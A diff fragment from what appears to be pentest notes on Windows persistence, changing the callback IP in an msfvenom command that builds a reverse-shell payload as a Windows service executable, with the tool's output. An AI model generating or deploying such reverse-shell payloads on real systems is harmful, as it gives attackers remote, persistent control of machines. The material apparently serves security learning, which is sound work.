@@ -24,7 +24,7 @@ Lets assume I'm in Administrator account and want to establishing persistence
 so im gonna make an exe-service payload in msfvenom
 
 ```bash
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.128.121 LPORT=1337 -f exe-service -o rev-svc.exe
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.100.101 LPORT=1337 -f exe-service -o rev-svc.exe
 
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 [-] No arch selected, selecting arch: x64 from the payload
